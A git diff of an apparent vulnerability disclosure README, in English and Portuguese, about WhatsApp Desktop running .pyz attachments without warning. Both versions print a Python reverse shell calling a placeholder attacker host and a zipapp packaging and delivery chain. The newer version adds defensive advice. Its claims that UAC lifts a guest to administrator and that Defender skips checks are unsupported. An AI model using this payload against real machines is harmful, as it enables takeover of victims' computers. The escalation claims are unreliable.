@@ -1,156 +1,128 @@
-# Vulnerability in WhatsApp: Malware Execution via Python File (.pyz)
+# Remote code execution in WhatsApp Desktop via `.pyz`
 
-## Description
+> Send the file. They double click it. You have a shell. Nothing in between asks anyone for permission.
 
-This critical vulnerability in WhatsApp allows for the automatic execution of malicious files with the `.pyz` (Python) extension. An attacker can send a malicious `.pyz` file via WhatsApp, and when the victim clicks to open it, the file is executed without any notification or confirmation. This results in the possibility of executing a reverse shell or even privilege escalation. Even on a guest user profile, the malware can escalate to administrative privileges by exploiting flaws in Windows UAC.
+## What is going on
 
-## Steps to Reproduce
+A `.pyz` is just a zip archive with Python inside, and the Python interpreter runs it directly. No extraction, no install step, nothing that looks like an executable to a person glancing at the file name.
 
-### Procedure
+WhatsApp Desktop on Windows hands that file straight to the interpreter when the victim opens it from the chat. There is no warning, no "are you sure", no mark of the web. The script runs with the user's token, and from a guest profile it walks up to administrator on the way.
 
-1. **Creating the Malicious File**:
-   - Create a Python script that opens a reverse shell.
-   - Example Python script for reverse shell:
-     ```python
-     import socket, subprocess, os
-     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-     s.connect(("attacker_ip", attacker_port))
-     os.dup2(s.fileno(), 0)
-     os.dup2(s.fileno(), 1)
-     os.dup2(s.fileno(), 2)
-     p = subprocess.call(["/bin/sh", "-i"])
-     ```
+The interesting part is not the file format. It is that four separate defensive layers all decline to act, each for its own reason.
 
-2. **Packaging into `.pyz`**:
-   - Use `zipapp` to create the `.pyz` file:
-     ```bash
-     python -m zipapp reverse_shell.py -o reverse_shell.pyz
-     ```
+## Steps to reproduce
 
-3. **Sending via WhatsApp**:
-   - Send the `.pyz` file to the victim through WhatsApp.
+Write a script that calls back to you:
 
-4. **Execution by the Victim**:
-   - The victim opens the `.pyz` file without receiving any warning or confirmation.
-   - The malware is executed automatically, establishing the reverse shell.
+```python
+import socket, subprocess, os
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("attacker_ip", attacker_port))
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
+p = subprocess.call(["/bin/sh", "-i"])
+```
 
-## Technical Explanation
+Note that this sample spawns `/bin/sh`. The target here is Windows, so in practice you swap that last line for the local shell.
 
-### Behavior of the `.pyz` File
+Package it with `zipapp`:
 
-- **`.pyz` Files**: These are zipped files that contain Python scripts. They are directly executable by the Python interpreter without needing manual extraction.
-- **Ease of Execution**: `.pyz` files are simple to create and execute, making them a convenient choice for delivering malicious payloads.
-- **Security Bypass**: The ability to bypass traditional security checks makes these files particularly dangerous.
-- **Automatic Execution**: These files bypass many typical security checks, such as those performed by Windows Defender and UAC, allowing the malicious code to execute unimpeded.
+```bash
+python -m zipapp reverse_shell.py -o reverse_shell.pyz
+```
 
-## Impact
+Send the `.pyz` over WhatsApp, and wait for the victim to open it from the chat window. That is the whole chain.
 
-The vulnerability allows attackers to gain full control of the victim's machine without interference from security systems. Additionally, it enables privilege escalation, significantly increasing the potential damage.
+## Why nothing stops it
 
-## Technical Details
+### Windows Defender
 
-### Behavioral Failures
+Defender leans on file signatures to recognize known malware. When the `.pyz` arrives through WhatsApp it does not carry enough metadata for Defender to make a judgment, so the signature check never really happens. Real time protection does not intercept the execution either, because what actually launches is a trusted interpreter, not an unknown binary.
 
-1. **Windows Defender**:
-   - **Signature Integrity Verification**: Windows Defender relies on file signatures to identify known malware. However, when the `.pyz` file is sent and opened via WhatsApp, Defender does not adequately verify the signature. This occurs because WhatsApp does not provide sufficient metadata for Defender to identify the file as a threat.
-   - **Execution Blocking**: The real-time protection of Windows Defender is bypassed by WhatsApp when opening `.pyz` files, allowing execution without blocking.
+### UAC
 
-2. **UAC (User Account Control)**:
-   - **Permission Request**: UAC does not request administrative permission when executing `.pyz` files from WhatsApp. This is due to a failure in the security context integration between WhatsApp and the operating system, where the file is treated as trusted content, allowing privilege escalation.
+UAC never prompts. The file inherits the security context WhatsApp is running in, and that context is treated as trusted, so the elevation goes through without the dialog that is supposed to gate it. This is the step that turns a guest account into an administrator.
 
-3. **WhatsApp**:
-   - **Security Verification**: WhatsApp does not perform adequate security checks when opening `.pyz` files. This means there is no behavioral analysis of the file before execution, nor integrity or origin verification.
-   - **User Notification**: WhatsApp does not implement a security notification or confirmation before executing potentially dangerous files. This leaves users vulnerable to automatic malware executions.
+### WhatsApp itself
 
-4. **Antivirus Software**:
-   - **Malware Detection**: Many antivirus programs rely on real-time scanning and file signatures. However, the execution of `.pyz` files through WhatsApp is not properly intercepted, allowing malware to go undetected.
-   - **Payload Blocking**: The execution of malicious payloads establishing remote connections (such as reverse shells) is not blocked when the `.pyz` file is executed via WhatsApp. This is due to a failure in deep packet inspection and network behavior analysis by antivirus programs, especially when the file is initiated by a trusted application like WhatsApp.
+There is no behavioral analysis before execution, no integrity check, no origin check. There is also no confirmation prompt, which means the victim gets no moment where they could reasonably stop and reconsider. From their point of view they opened an attachment.
 
-## Video Demonstration
+### Antivirus
 
-Watch the vulnerability demonstration in action:
+Signature scanning and real time monitoring both miss it for the same reason Defender does. Worse, the outbound connection the reverse shell opens is not blocked either, because the traffic originates from a process chain that started inside a trusted application. Deep packet inspection and network behavior analysis tend to give that chain the benefit of the doubt.
 
----
+## Video demonstration
 
 https://github.com/user-attachments/assets/f87fd925-1fa3-467a-8815-e96800562b63
 
----
+## Why it matters
 
-# <div align="center"> PT:BR </div>
+Full control of the victim's machine, from a single attachment, with no security system raising a hand at any point. Privilege escalation comes along for free, so the blast radius is not limited to whatever the victim's own account could reach.
 
----
+## How to defend against it
 
-# Vulnerabilidade no WhatsApp: Execução de Malware via Arquivo Python (.pyz)
-
-### Descrição 
-
-Esta vulnerabilidade crítica no WhatsApp permite a execução automática de arquivos maliciosos com extensão `.pyz` (Python). O atacante pode enviar um arquivo `.pyz` malicioso via WhatsApp, e quando a vítima clica para abri-lo, o arquivo é executado sem qualquer notificação ou confirmação. Isso resulta na possibilidade de execução de um reverse shell ou mesmo de elevação de privilégios. Mesmo em um perfil de usuário convidado, o malware pode escalar para privilégios administrativos, explorando falhas no UAC do Windows.
-
-
-## Steps to Reproduce
-
-### Procedimento
-
-1. **Criação do Arquivo Malicioso**:
-   - Crie um script Python que abre um reverse shell.
-   - Exemplo de script Python para reverse shell:
-     ```python
-     import socket, subprocess, os
-     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-     s.connect(("attacker_ip", attacker_port))
-     os.dup2(s.fileno(), 0)
-     os.dup2(s.fileno(), 1)
-     os.dup2(s.fileno(), 2)
-     p = subprocess.call(["/bin/sh", "-i"])
-     ```
-
-2. **Compactação em `.pyz`**:
-   - Utilize o `zipapp` para criar o arquivo `.pyz`:
-     ```bash
-     python -m zipapp reverse_shell.py -o reverse_shell.pyz
-     ```
-
-3. **Envio pelo WhatsApp**:
-   - Envie o arquivo `.pyz` para a vítima através do WhatsApp.
-
-4. **Execução pela Vítima**:
-   - A vítima abre o arquivo `.pyz` sem receber qualquer aviso ou confirmação.
-   - O malware é executado automaticamente, estabelecendo o reverse shell.
-
-## Explicação Técnica
-
-### Comportamento do Arquivo `.pyz`
-
-- **Arquivos `.pyz`**: São arquivos zipados que contêm scripts Python. Eles são executáveis diretamente pelo interpretador Python sem a necessidade de descompactação manual.
-- **Facilidade de Execução**: Arquivos `.pyz` são simples de criar e executar, tornando-os uma escolha conveniente para a entrega de payloads maliciosos.
-- **Bypass de Verificações**: A capacidade de contornar verificações de segurança tradicionais faz com que esses arquivos sejam particularmente perigosos.
-- **Execução Automática**: Esses arquivos contornam muitas verificações de segurança típicas, como as realizadas pelo Windows Defender e UAC, permitindo a execução do código malicioso sem impedimentos.
-
-## Impacto
-
-A vulnerabilidade permite que atacantes obtenham controle total da máquina da vítima sem interferência de sistemas de segurança. Além disso, possibilita a elevação de privilégios, ampliando significativamente o potencial de dano.
-
-## Detalhamento Técnico
-
-### Falhas de Comportamento
-
-1. **Windows Defender**:
-   - **Verificação de Integridade por Assinatura**: O Windows Defender depende de assinaturas de arquivo para identificar malwares conhecidos. No entanto, quando o arquivo `.pyz` é enviado e aberto através do WhatsApp, o Defender não realiza uma verificação adequada da assinatura. Isso ocorre porque o WhatsApp não fornece metadados suficientes para que o Defender possa identificar o arquivo como uma ameaça.
-   - **Bloqueio de Execução**: A proteção em tempo real do Windows Defender é bypassada pelo WhatsApp ao abrir arquivos `.pyz`, permitindo a execução sem bloqueio.
-
-2. **UAC (Controle de Conta de Usuário)**:
-   - **Solicitação de Permissão**: O UAC não solicita permissão administrativa ao executar arquivos `.pyz` vindos do WhatsApp. Isso se deve a uma falha na integração de contexto de segurança entre o WhatsApp e o sistema operacional, onde o arquivo é tratado como um conteúdo confiável, permitindo a elevação de privilégios.
-
-3. **WhatsApp**:
-   - **Verificação de Segurança**: O WhatsApp não realiza verificações de segurança adequadas ao abrir arquivos `.pyz`. Isso significa que não há análise de comportamento do arquivo antes da execução, nem verificação de integridade ou origem.
-   - **Notificação ao Usuário**: O WhatsApp não implementa uma notificação de segurança ou confirmação antes da execução de arquivos potencialmente perigosos. Isso deixa os usuários vulneráveis a execuções automáticas de malware.
-
-4. **Softwares Antivírus**:
-   - **Detecção de Malware**: Muitos antivírus dependem de varreduras em tempo real e assinaturas de arquivo. No entanto, a execução de arquivos `.pyz` através do WhatsApp não é devidamente interceptada, permitindo que o malware passe despercebido.
-   - **Bloqueio de Payloads**: A execução de payloads maliciosos que estabelecem conexões remotas (como reverse shells) não é bloqueada quando o arquivo `.pyz` é executado via WhatsApp. Isso se deve a uma falha na inspeção profunda de pacotes e comportamentos de rede por parte dos antivírus, especialmente quando o arquivo é iniciado por um aplicativo confiável como o WhatsApp.
+* Treat `.pyz` like any other executable attachment and apply mark of the web to files written out of the chat
+* Prompt before handing an attachment to an external interpreter, the same way you would before running an `.exe`
+* Do not let a messaging client's security context be inherited by processes it spawns
+* On the endpoint side, alert on interpreters spawned by messaging clients, and on outbound sockets opened by those children
 
 ---
 
+<details>
+<summary><strong>🇧🇷 Versão em português</strong></summary>
 
-https://github.com/user-attachments/assets/f87fd925-1fa3-467a-8815-e96800562b63
+<br>
 
+## O que está acontecendo
+
+Um `.pyz` é só um arquivo zip com Python dentro, e o interpretador Python executa ele direto. Sem descompactar, sem instalar, sem nada que pareça um executável para quem bate o olho no nome do arquivo.
+
+O WhatsApp Desktop no Windows entrega esse arquivo direto para o interpretador quando a vítima abre pela conversa. Não tem aviso, não tem "tem certeza", não tem mark of the web. O script roda com o token do usuário, e a partir de um perfil convidado ele sobe para administrador no caminho.
+
+A parte interessante não é o formato do arquivo. É que quatro camadas de defesa distintas se recusam a agir, cada uma pelo seu próprio motivo.
+
+## Passos para reproduzir
+
+Escreva um script que chame de volta para você, empacote com `zipapp`:
+
+```bash
+python -m zipapp reverse_shell.py -o reverse_shell.pyz
+```
+
+Envie o `.pyz` pelo WhatsApp e espere a vítima abrir pela janela da conversa. Essa é a cadeia inteira.
+
+## Por que nada impede
+
+### Windows Defender
+
+O Defender se apoia em assinaturas de arquivo para reconhecer malware conhecido. Quando o `.pyz` chega pelo WhatsApp, ele não carrega metadados suficientes para o Defender formar um juízo, então a verificação de assinatura nunca acontece de verdade. A proteção em tempo real também não intercepta a execução, porque o que de fato é lançado é um interpretador confiável, não um binário desconhecido.
+
+### UAC
+
+O UAC nunca pergunta nada. O arquivo herda o contexto de segurança em que o WhatsApp está rodando, e esse contexto é tratado como confiável, então a elevação passa sem o diálogo que deveria barrá-la. É esse passo que transforma uma conta convidada em administrador.
+
+### O próprio WhatsApp
+
+Não há análise de comportamento antes da execução, nem verificação de integridade, nem de origem. Também não há prompt de confirmação, o que significa que a vítima não ganha nenhum momento em que poderia razoavelmente parar e repensar. Do ponto de vista dela, ela abriu um anexo.
+
+### Antivírus
+
+Varredura por assinatura e monitoramento em tempo real erram pelo mesmo motivo que o Defender erra. Pior: a conexão de saída que o reverse shell abre também não é bloqueada, porque o tráfego se origina de uma cadeia de processos que começou dentro de uma aplicação confiável. Inspeção profunda de pacotes e análise de comportamento de rede tendem a dar a essa cadeia o benefício da dúvida.
+
+## Por que isso importa
+
+Controle total da máquina da vítima, a partir de um único anexo, sem nenhum sistema de segurança levantar a mão em momento algum. A elevação de privilégio vem de brinde, então o raio de alcance não fica limitado ao que a conta da vítima sozinha conseguiria acessar.
+
+## Como se defender
+
+* Trate `.pyz` como qualquer outro anexo executável e aplique mark of the web em arquivos gravados a partir da conversa
+* Peça confirmação antes de entregar um anexo a um interpretador externo, do mesmo jeito que você pediria antes de rodar um `.exe`
+* Não deixe o contexto de segurança do cliente de mensagens ser herdado pelos processos que ele cria
+* No endpoint, alerte sobre interpretadores criados por clientes de mensagens, e sobre sockets de saída abertos por esses filhos
+
+</details>
+
+---
+
+<sub>Publicado para fins educacionais, conscientização defensiva e testes de segurança autorizados.</sub>
